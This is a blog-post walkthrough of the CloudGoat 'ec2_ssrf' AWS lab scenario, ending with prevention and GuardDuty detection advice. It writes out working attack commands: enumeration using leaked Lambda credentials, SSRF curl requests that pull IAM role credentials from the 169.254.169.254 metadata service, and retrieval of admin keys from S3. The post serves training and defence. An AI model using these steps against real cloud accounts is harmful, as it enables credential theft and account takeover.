<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>ec2_ssrf | JellyParks</title><meta name=keywords content="aws,cloud,cloudgoat,walkthrough,ctf"><meta name=description content="Cloud Goat ec2 ssrf scenario walkthrough"><meta name=author content="Travis"><link rel=canonical href=https://jellyparks.com/posts/ec2-ssrf/><link crossorigin=anonymous href=/assets/css/stylesheet.min.ec8da366ca2fb647537ccb7a8f6fa5b4e9cd3c7a0d3171dd2d3baad1e49c8bfc.css integrity="sha256-7I2jZsovtkdTfMt6j2+ltOnNPHoNMXHdLTuq0eSci/w=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.min.2840b7fccd34145847db71a290569594bdbdb00047097f75d6495d162f5d7dff.js integrity="sha256-KEC3/M00FFhH23GikFaVlL29sABHCX911kldFi9dff8=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://jellyparks.com/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://jellyparks.com/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://jellyparks.com/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://jellyparks.com/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://jellyparks.com/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,o,i,a,t,n,s){e.GoogleAnalyticsObject=t,e[t]=e[t]||function(){(e[t].q=e[t].q||[]).push(arguments)},e[t].l=1*new Date,n=o.createElement(i),s=o.getElementsByTagName(i)[0],n.async=1,n.src=a,s.parentNode.insertBefore(n,s)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="ec2_ssrf"><meta property="og:description" content="Cloud Goat ec2 ssrf scenario walkthrough"><meta property="og:type" content="article"><meta property="og:url" content="https://jellyparks.com/posts/ec2-ssrf/"><meta property="og:image" content="https://jellyparks.com/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2018-11-28T00:00:00+00:00"><meta property="article:modified_time" content="2018-11-28T00:00:00+00:00"><meta property="og:site_name" content="JellyParks"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://jellyparks.com/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="ec2_ssrf"><meta name=twitter:description content="Cloud Goat ec2 ssrf scenario walkthrough"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://jellyparks.com/posts/"},{"@type":"ListItem","position":3,"name":"ec2_ssrf","item":"https://jellyparks.com/posts/ec2-ssrf/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"ec2_ssrf","name":"ec2_ssrf","description":"Cloud Goat ec2 ssrf scenario walkthrough","keywords":["aws","cloud","cloudgoat","walkthrough","ctf"],"articleBody":" According to the official documentation for this scenario (here) the overall goal is to “Invoke the “cg-lambda-[ CloudGoat ID ]” Lambda function.”\nScenario Setup To get everything up we just have to run:\npython3 cloudgoat.py create ec2_ssrf Once the build process compeletes we are provided with a set of credentials for the Solus user. We should validate that the credentials work. The get caller identity is a great command for this and is the equivilant to running whoami.\naws --profile solus sts get-caller-identity A response should come back with letting us know that we are the Solus user.\n{ \"UserId\": \"AIDASDFASFSADFBBAJMXFY3\", \"Account\": \"121212121212\", \"Arn\": \"arn:aws:iam::121212121212:user/solus\" }  Solus In the real world, we probably wouldn’t just be handed these credentials. However, people make mistakes and credentials are often accidentally exposed. Let’s start doing basic enumeration and see if we can determine what things we have access to. To do this we’ll run the following set of commands just to poke at a few of the more common services:\naws --profile solus s3 ls aws --profile solus ec2 describe-instances aws --profile solus iam list-roles aws --profile solus lambda list-functions All of those commands result in an access denied error with the exception of the lambda request\nThe lambda call returns details for one function called cg-lambda-cgidheuaifn6y6. Looking at the output pictured below we can see that there is a second set or credentials stored as environment variables for this function.\nAdditionally, we can see that the function has a role associated with it. This means that the function more than likely has permissions to make additional calls. Before switching to the new credetntials let’s grab the Lambda function and see if there are any additional details that may be of use. We can do that by running the following command:\naws --profile solus lambda get-function --function-name cg-lambda-cgidheuaifn6y6 This will produce the output below. Which contains a link where we can download a zipped copy of the function code.\nAfter downloading, and extracting the code we discover it’s a simple python script which returns the message You win!. This is the function that we need to invoke in order to ‘win’ the challenge. We will see if we can run the function with the Solus user in a moment, but first let’s look at how we could leverage Pacu to grab the function for us.\nOnce Pacu is configured with Solus credentials we can run the lambda__enum enumeration function for the us-east-1 region. The output from that command is below:\nAs expected one function was discovered. When we run the data Lambda command in Pacu we can see that Pacu has already requested the function data for us and we have a download link to grab the code. The enum__lambda module automatically makes the list-functiosn call and the get-function call for each function discovered. This is helpful if there are a large number of functions to parse through.\nNow, let’s see if we can invoke the function and win this challenge with our Solus user credentials. We can invoke the function with the following command\naws --profile solus lambda invoke --function-name=cg-lambda-cgidheuaifn6y6 /tmp/outfile.txt Unfortunatly for us, it looks like we are not allowed run invoke this function. We received an Access Denied error. Let’s backtrack a bit and use the credentials we discovered in the function environment variables. Once they’ve been added to the credentials file we can confirm that they by running sts get-caller-identity. That command produces that out below:\n{ \"UserId\": \"AIDA5X73I5MBOZ4A4P4DG\", \"Account\": \"121212121212\", \"Arn\": \"arn:aws:iam::121212121212:user/wrex\" }  Wrex It appears that the credentials which were stored as environment variables for the function are credentials for the ‘wrex’ user account. Perhaps this user can invoke the function? Lets give it a shot.\naws --profile wrex lambda invoke --function-name=cg-lambda-cgidheuaifn6y6 /tmp/outfile.txt Once again, access denied. Let’s begin the enumeration process to determine what these keys are allowed to do. We can run the same commands we ran earlier to get a better idea what these credentials are allowed to do.\naws --profile wrex s3 ls aws --profile wrex ec2 describe-instances aws --profile wrex iam list-roles aws --profile wrex lambda list-functions All of the commands fail with the exception of the ec2 describe-instances command. Looking at the output below we can see that the ec2 instance has a public IP and according to the security group looks to be listening on port 80. We can also see the instance has an instance profile associated with it which means there are more than likely permissions that we can leverage to gain further access within aws.\n curl Curling the url results initially in an error:\nThe error stats that URL must be a string, not undefied. Perhaps this is a parameter we can pass in? Running the following command results in the same error:\ncurl http://ec2-34-229-224-250.compute-1.amazonaws.com/\\?URL\\=asdf.com What if we tried it all lower case? Perhaps the error is uppercasing the parameter and that is causing the error.\ncurl http://ec2-34-229-224-250.compute-1.amazonaws.com/\\?url\\=asdf.com Awesome, we get the output pictured below. It looks like this application is proxying web traffic for us.\nIf that is the case then any url we enter into the url parameter this application will fetch for us. Let’s see if we can talk to the meta-data service for this instance.\ncurl http://ec2-34-229-224-250.compute-1.amazonaws.com/\\?url\\=http://169.254.169.254/latest/ This results in the output below:\nKnowing we can talk to the meta data endpoint lets see if we can pull the credentials off of this ec2 instance. We can accomplish this with the following command:\ncurl http://ec2-34-229-224-250.compute-1.amazonaws.com/\\?url\\=http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-cgidheuaifn6y6 The server responds with everything we need to impersonate this instance and dig deeper into aws.\nIt’s worth mentioning, while we jumped straight to pulling creds from this instance the user-data endpoint can hold very valuable information.\nUsing the credentials from the instance we can run the get get-caller-identity command and make sure they are valid. We get the output below:\nOnce again, as we do with any new set of credentials, let’s see what all we can do with them.\naws --profile ec2 s3 ls aws --profile ec2 ec2 describe-instances aws --profile ec2 iam list-roles aws --profile ec2 lambda list-functions Much like our previous enumeration attempts, everything failed except for one call. In this case the s3 ls command was successful and we get the name for every bucket in the account:\nRunning the s3 ls command on one of the buckets we get the response below showing a text file called ‘admin-user.txt’. This sounds potentially promising. Let’s download the file.\nTo download the file we’ll run the s3 cp command:\naws --profile ec2 s3 cp s3://cg-secret-s3-bucket-cgidheuaifn6y6/admin-user.txt /tmp/admin-user.txt Once the file is copied, we can examine the data within it. The file appears to hold a set of user credentials. Based on the name of the file, it is safe to assume that these will be admin credentials. Perhaps the account owner is storing them here as a backup or perhaps this key is a honey key and as soon as we use it the organizations security team will be alerted. Only one way to find out.\naws --profile s3_cred sts get-caller-identity { \"UserId\": \"AIDA5X73WERWERGXKIKBZ\", \"Account\": \"121212121212\", \"Arn\": \"arn:aws:iam::121212121212:user/shepard\" } Perfect! We now have the ‘Shepard’ user’s credentials. Lets see if we can invoke the lambda function. We can do that with the command below, which produces the 200 output.\naws --profile shepard lambda invoke --function-name=cg-lambda-cgidheuaifn6y6 out.txt { \"StatusCode\": 200, \"ExecutedVersion\": \"$LATEST\" } It would appear that the command executed successfully. Reading the output text file we’re greated with You win! This indicates that we have completed the challenge. Poking around a bit more and it becomes clear that the Shepard user is an admin level account with full access to do anything within the account.\n Prevention So, how do we prevent this. Where did the owner of this account go wrong? There are a few places where this could have be stopped. Lets dive into them.\n The first and probably the biggest thing that whould have prevented this is: do not store credentials as unencrypted environment variables. In the case of this script the credentials were aws access keys. Those should never be there. Let the script assume a role to gain access to resources it needs. This one thing would have stopped this entire attack path dead in its tracks. The ec2 instance is listening on port 80 to the entire world. Does it need to? Could it be scoped to a limited number of addresses? If so that should be done. If that isn’t possible because of a business need that it exists, thats fine but we need some controls. The website should not exist in its current state. The first goal should be to work with the business to understand what they are trying to accomplish. If possible removing the proxy page would be ideal. Does the ec2 instance need access to s3? From what we observed there was no real purpose for the instance to be able to directly access s3. If this is the case, can we remove the profile association? Without a profile, the instance would no longer be able to talk to aws services in the same way. This would drastically limit the impact radius if it does become compromised. The s3 bucket storing a backup copy of the Shepards credentials should be removed. This should never ever exist. These credentials should be stored in a secure password vault and not in a text file in a s3 bucket.   Detection What about GuardDuty? That should detect all of this right? The short answer is sort of, but it depends on who is looking. Since we used access keys for all of our access it limits the scope of which alerts would fire. The only alert that would potentially fire for all of the activity we conducted would have been the UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration. When we exfiled the credentials from the Ec2 we ran all of our AWS commands from an IP address outside of AWS. This would trigger this particular alert. The Recon:IAMUser/UserPermissions alert may have also fired since we queried iam a few times attempting to list the roles within the account. Thats it, no other alerts would have been triggered.\nSo how else could we catch this activity? One way would be to base line user activity, and if anyone deviates from that fire an alert. Another possible way to detect this behavior would be to add alerts for specific API calls. If iam listRoles isn’t common in your organization you could fire on that. Perhaps GetCallerIdentity is not used frequently and you could alert on that. If those don’t work, building something which thresholds API calls and once a certain amount of ‘potentially malicious’ calls are made triggers an alert to fire. Example: ListRoles isn’t bad when its alone, but if GetCallerIdentity fires, and then within 5 minutes ListRoles is, perhaps thats enough to trip an alert.\nWhat if the Admin access keys we found were honey tokens. As soon as we tried to use those keys the security team would have been notified and the race would be on.\n","wordCount":"1842","inLanguage":"en","datePublished":"2018-11-28T00:00:00Z","dateModified":"2018-11-28T00:00:00Z","author":{"@type":"Person","name":"Travis"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://jellyparks.com/posts/ec2-ssrf/"},"publisher":{"@type":"Organization","name":"JellyParks","logo":{"@type":"ImageObject","url":"https://jellyparks.com/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://jellyparks.com accesskey=h title="Home (Alt + H)">Home</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu><li><a href=https://jellyparks.com/posts title=all_posts><span>all_posts</span></a></li><li><a href=https://jellyparks.com/categories/ title=categories><span>categories</span></a></li><li><a href=https://jellyparks.com/tags/ title=tags><span>tags</span></a></li><li><a href=https://jellyparks.com/me/ title=me><span>me</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://jellyparks.com>Home</a>&nbsp;»&nbsp;<a href=https://jellyparks.com/posts/>Posts</a></div><h1 class=post-title>ec2_ssrf</h1><div class=post-meta><span title="2018-11-28 00:00:00 +0000 UTC">November 28, 2018</span>&nbsp;·&nbsp;9 min&nbsp;·&nbsp;Travis&nbsp;|&nbsp;<a href=https://github.com/yogisec/yogisec.github.io/blob/main/content/posts/ec2-ssrf/index.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#scenario-setup aria-label="Scenario Setup">Scenario Setup</a></li><li><a href=#solus aria-label=Solus>Solus</a></li><li><a href=#wrex aria-label=Wrex>Wrex</a></li><li><a href=#curl aria-label=curl>curl</a></li><li><a href=#prevention aria-label=Prevention>Prevention</a></li><li><a href=#detection aria-label=Detection>Detection</a></li></ul></div></details></div><div class=post-content><hr><p>According to the official documentation for this scenario (<a href=https://github.com/RhinoSecurityLabs/cloudgoat/tree/master/scenarios/ec2_ssrf>here</a>) the overall goal is to &ldquo;Invoke the &ldquo;cg-lambda-[ CloudGoat ID ]&rdquo; Lambda function.&rdquo;</p><h3 id=scenario-setup>Scenario Setup<a hidden class=anchor aria-hidden=true href=#scenario-setup>#</a></h3><p>To get everything up we just have to run:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 cloudgoat.py create ec2_ssrf
</span></span></code></pre></div><p>Once the build process compeletes we are provided with a set of credentials for the Solus user. We should validate that the credentials work. The get caller identity is a great command for this and is the equivilant to running <code>whoami</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws --profile solus sts get-caller-identity
</span></span></code></pre></div><p>A response should come back with letting us know that we are the Solus user.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl><span class=nt>&#34;UserId&#34;</span><span class=p>:</span> <span class=s2>&#34;AIDASDFASFSADFBBAJMXFY3&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=nt>&#34;Account&#34;</span><span class=p>:</span> <span class=s2>&#34;121212121212&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=nt>&#34;Arn&#34;</span><span class=p>:</span> <span class=s2>&#34;arn:aws:iam::121212121212:user/solus&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><hr><h3 id=solus>Solus<a hidden class=anchor aria-hidden=true href=#solus>#</a></h3><p>In the real world, we probably wouldn&rsquo;t just be handed these credentials. However, people make mistakes and credentials are often accidentally exposed. Let&rsquo;s start doing basic enumeration and see if we can determine what things we have access to. To do this we&rsquo;ll run the following set of commands just to poke at a few of the more common services:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws --profile solus s3 ls
</span></span><span class=line><span class=cl>aws --profile solus ec2 describe-instances
</span></span><span class=line><span class=cl>aws --profile solus iam list-roles
</span></span><span class=line><span class=cl>aws --profile solus lambda list-functions
</span></span></code></pre></div><p>All of those commands result in an access denied error with the exception of the lambda request</p><p><img loading=lazy src=images/accessdenied.png alt="Access Denied" title=img-fluid></p><p>The lambda call returns details for one function called <code>cg-lambda-cgidheuaifn6y6</code>. Looking at the output pictured below we can see that there is a second set or credentials stored as environment variables for this function.</p><p><img loading=lazy src=images/list-functions.png alt="List Functions" title=img-fluid></p><p>Additionally, we can see that the function has a role associated with it. This means that the function more than likely has permissions to make additional calls. Before switching to the new credetntials let&rsquo;s grab the Lambda function and see if there are any additional details that may be of use. We can do that by running the following command:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws --profile solus lambda get-function --function-name cg-lambda-cgidheuaifn6y6
</span></span></code></pre></div><p>This will produce the output below. Which contains a link where we can download a zipped copy of the function code.</p><p><img loading=lazy src=images/get-function.png alt="Get Functions" title=img-fluid></p><p>After downloading, and extracting the code we discover it&rsquo;s a simple python script which returns the message <code>You win!</code>. This is the function that we need to invoke in order to &lsquo;win&rsquo; the challenge. We will see if we can run the function with the Solus user in a moment, but first let&rsquo;s look at how we could leverage Pacu to grab the function for us.</p><p>Once Pacu is configured with Solus credentials we can run the <code>lambda__enum</code> enumeration function for the us-east-1 region. The output from that command is below:</p><p><img loading=lazy src=images/broken.png alt=Pacu_enum title=img-fluid></p><p>As expected one function was discovered. When we run the <code>data Lambda</code> command in Pacu we can see that Pacu has already requested the function data for us and we have a download link to grab the code. The enum__lambda module automatically makes the list-functiosn call and the get-function call for each function discovered. This is helpful if there are a large number of functions to parse through.</p><p>Now, let&rsquo;s see if we can invoke the function and win this challenge with our Solus user credentials. We can invoke the function with the following command</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws --profile solus lambda invoke --function-name<span class=o>=</span>cg-lambda-cgidheuaifn6y6 /tmp/outfile.txt
</span></span></code></pre></div><p>Unfortunatly for us, it looks like we are not allowed run invoke this function. We received an Access Denied error. Let&rsquo;s backtrack a bit and use the credentials we discovered in the function environment variables. Once they&rsquo;ve been added to the credentials file we can confirm that they by running <code>sts get-caller-identity</code>. That command produces that out below:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl> <span class=nt>&#34;UserId&#34;</span><span class=p>:</span> <span class=s2>&#34;AIDA5X73I5MBOZ4A4P4DG&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl> <span class=nt>&#34;Account&#34;</span><span class=p>:</span> <span class=s2>&#34;121212121212&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl> <span class=nt>&#34;Arn&#34;</span><span class=p>:</span> <span class=s2>&#34;arn:aws:iam::121212121212:user/wrex&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><hr><h3 id=wrex>Wrex<a hidden class=anchor aria-hidden=true href=#wrex>#</a></h3><p>It appears that the credentials which were stored as environment variables for the function are credentials for the &lsquo;wrex&rsquo; user account. Perhaps this user can invoke the function? Lets give it a shot.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws --profile wrex lambda invoke --function-name<span class=o>=</span>cg-lambda-cgidheuaifn6y6 /tmp/outfile.txt
</span></span></code></pre></div><p>Once again, access denied. Let&rsquo;s begin the enumeration process to determine what these keys are allowed to do. We can run the same commands we ran earlier to get a better idea what these credentials are allowed to do.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws --profile wrex s3 ls
</span></span><span class=line><span class=cl>aws --profile wrex ec2 describe-instances
</span></span><span class=line><span class=cl>aws --profile wrex iam list-roles
</span></span><span class=line><span class=cl>aws --profile wrex lambda list-functions
</span></span></code></pre></div><p>All of the commands fail with the exception of the ec2 describe-instances command. Looking at the output below we can see that the ec2 instance has a public IP and according to the security group looks to be listening on port 80. We can also see the instance has an instance profile associated with it which means there are more than likely permissions that we can leverage to gain further access within aws.</p><p><img loading=lazy src=images/ec2-describe.png alt=ec2-describe title=img-fluid></p><hr><h3 id=curl>curl<a hidden class=anchor aria-hidden=true href=#curl>#</a></h3><p>Curling the url results initially in an error:</p><p><img loading=lazy src=images/curl-error.png alt="curl error" title=img-fluid></p><p>The error stats that URL must be a string, not undefied. Perhaps this is a parameter we can pass in? Running the following command results in the same error:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl http://ec2-34-229-224-250.compute-1.amazonaws.com/<span class=se>\?</span>URL<span class=se>\=</span>asdf.com
</span></span></code></pre></div><p>What if we tried it all lower case? Perhaps the error is uppercasing the parameter and that is causing the error.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl http://ec2-34-229-224-250.compute-1.amazonaws.com/<span class=se>\?</span>url<span class=se>\=</span>asdf.com
</span></span></code></pre></div><p>Awesome, we get the output pictured below. It looks like this application is proxying web traffic for us.</p><p><img loading=lazy src=images/raw-html.png alt="raw html" title=img-fluid></p><p>If that is the case then any url we enter into the url parameter this application will fetch for us. Let&rsquo;s see if we can talk to the meta-data service for this instance.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl http://ec2-34-229-224-250.compute-1.amazonaws.com/<span class=se>\?</span>url<span class=se>\=</span>http://169.254.169.254/latest/
</span></span></code></pre></div><p>This results in the output below:</p><p><img loading=lazy src=images/meta-data.png alt="meta data" title=img-fluid></p><p>Knowing we can talk to the meta data endpoint lets see if we can pull the credentials off of this ec2 instance. We can accomplish this with the following command:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl http://ec2-34-229-224-250.compute-1.amazonaws.com/<span class=se>\?</span>url<span class=se>\=</span>http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-cgidheuaifn6y6
</span></span></code></pre></div><p>The server responds with everything we need to impersonate this instance and dig deeper into aws.</p><p><img loading=lazy src=images/ec2-creds.png alt="ec2 credentials" title=img-fluid></p><p><em>It&rsquo;s worth mentioning, while we jumped straight to pulling creds from this instance the user-data endpoint can hold very valuable information.</em></p><p>Using the credentials from the instance we can run the get get-caller-identity command and make sure they are valid. We get the output below:</p><p><img loading=lazy src=images/ec2-whoami.png alt="ec2 whoami" title=img-fluid></p><p>Once again, as we do with any new set of credentials, let&rsquo;s see what all we can do with them.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws --profile ec2 s3 ls
</span></span><span class=line><span class=cl>aws --profile ec2 ec2 describe-instances
</span></span><span class=line><span class=cl>aws --profile ec2 iam list-roles
</span></span><span class=line><span class=cl>aws --profile ec2 lambda list-functions
</span></span></code></pre></div><p>Much like our previous enumeration attempts, everything failed except for one call. In this case the s3 ls command was successful and we get the name for every bucket in the account:</p><p><img loading=lazy src=images/s3-ls.png alt="s3 ls" title=img-fluid></p><p>Running the s3 ls command on one of the buckets we get the response below showing a text file called &lsquo;admin-user.txt&rsquo;. This sounds potentially promising. Let&rsquo;s download the file.</p><p><img loading=lazy src=images/s3-admin.png alt="s3 admin" title=img-fluid></p><p>To download the file we&rsquo;ll run the s3 cp command:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws --profile ec2 s3 cp s3://cg-secret-s3-bucket-cgidheuaifn6y6/admin-user.txt /tmp/admin-user.txt
</span></span></code></pre></div><p>Once the file is copied, we can examine the data within it. The file appears to hold a set of user credentials. Based on the name of the file, it is safe to assume that these will be admin credentials. Perhaps the account owner is storing them here as a backup or perhaps this key is a honey key and as soon as we use it the organizations security team will be alerted. Only one way to find out.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws --profile s3_cred sts get-caller-identity
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl> <span class=s2>&#34;UserId&#34;</span>: <span class=s2>&#34;AIDA5X73WERWERGXKIKBZ&#34;</span>,
</span></span><span class=line><span class=cl> <span class=s2>&#34;Account&#34;</span>: <span class=s2>&#34;121212121212&#34;</span>,
</span></span><span class=line><span class=cl> <span class=s2>&#34;Arn&#34;</span>: <span class=s2>&#34;arn:aws:iam::121212121212:user/shepard&#34;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></div><p>Perfect! We now have the &lsquo;Shepard&rsquo; user&rsquo;s credentials. Lets see if we can invoke the lambda function. We can do that with the command below, which produces the 200 output.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws --profile shepard lambda invoke --function-name<span class=o>=</span>cg-lambda-cgidheuaifn6y6 out.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl> <span class=s2>&#34;StatusCode&#34;</span>: 200,
</span></span><span class=line><span class=cl> <span class=s2>&#34;ExecutedVersion&#34;</span>: <span class=s2>&#34;</span><span class=nv>$LATEST</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></div><p>It would appear that the command executed successfully. Reading the output text file we&rsquo;re greated with <code>You win!</code> This indicates that we have completed the challenge. Poking around a bit more and it becomes clear that the Shepard user is an admin level account with full access to do anything within the account.</p><hr><h3 id=prevention>Prevention<a hidden class=anchor aria-hidden=true href=#prevention>#</a></h3><p>So, how do we prevent this. Where did the owner of this account go wrong? There are a few places where this could have be stopped. Lets dive into them.</p><ol><li>The first and probably the biggest thing that whould have prevented this is: do not store credentials as unencrypted environment variables. In the case of this script the credentials were aws access keys. Those should never be there. Let the script assume a role to gain access to resources it needs. This one thing would have stopped this entire attack path dead in its tracks.</li><li>The ec2 instance is listening on port 80 to the entire world. Does it need to? Could it be scoped to a limited number of addresses? If so that should be done. If that isn&rsquo;t possible because of a business need that it exists, thats fine but we need some controls. The website should not exist in its current state. The first goal should be to work with the business to understand what they are trying to accomplish. If possible removing the proxy page would be ideal.</li><li>Does the ec2 instance need access to s3? From what we observed there was no real purpose for the instance to be able to directly access s3. If this is the case, can we remove the profile association? Without a profile, the instance would no longer be able to talk to aws services in the same way. This would drastically limit the impact radius if it does become compromised.</li><li>The s3 bucket storing a backup copy of the Shepards credentials should be removed. This should never ever exist. These credentials should be stored in a secure password vault and not in a text file in a s3 bucket.</li></ol><hr><h3 id=detection>Detection<a hidden class=anchor aria-hidden=true href=#detection>#</a></h3><p>What about GuardDuty? That should detect all of this right? The short answer is sort of, but it depends on who is looking. Since we used access keys for all of our access it limits the scope of which alerts would fire. The only alert that would potentially fire for all of the activity we conducted would have been the <code>UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration</code>. When we exfiled the credentials from the Ec2 we ran all of our AWS commands from an IP address outside of AWS. This would trigger this particular alert. The <code>Recon:IAMUser/UserPermissions</code> alert may have also fired since we queried iam a few times attempting to list the roles within the account. Thats it, no other alerts would have been triggered.</p><p>So how else could we catch this activity? One way would be to base line user activity, and if anyone deviates from that fire an alert. Another possible way to detect this behavior would be to add alerts for specific API calls. If iam listRoles isn&rsquo;t common in your organization you could fire on that. Perhaps GetCallerIdentity is not used frequently and you could alert on that. If those don&rsquo;t work, building something which thresholds API calls and once a certain amount of &lsquo;potentially malicious&rsquo; calls are made triggers an alert to fire. Example: ListRoles isn&rsquo;t bad when its alone, but if GetCallerIdentity fires, and then within 5 minutes ListRoles is, perhaps thats enough to trip an alert.</p><p>What if the Admin access keys we found were honey tokens. As soon as we tried to use those keys the security team would have been notified and the race would be on.</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://jellyparks.com/tags/aws/>aws</a></li><li><a href=https://jellyparks.com/tags/cloud/>cloud</a></li><li><a href=https://jellyparks.com/tags/cloudgoat/>cloudgoat</a></li><li><a href=https://jellyparks.com/tags/walkthrough/>walkthrough</a></li><li><a href=https://jellyparks.com/tags/ctf/>ctf</a></li></ul><nav class=paginav><a class=prev href=https://jellyparks.com/posts/codebuild-secrets/><span class=title>« Prev Page</span><br><span>codebuild_secrets</span></a>
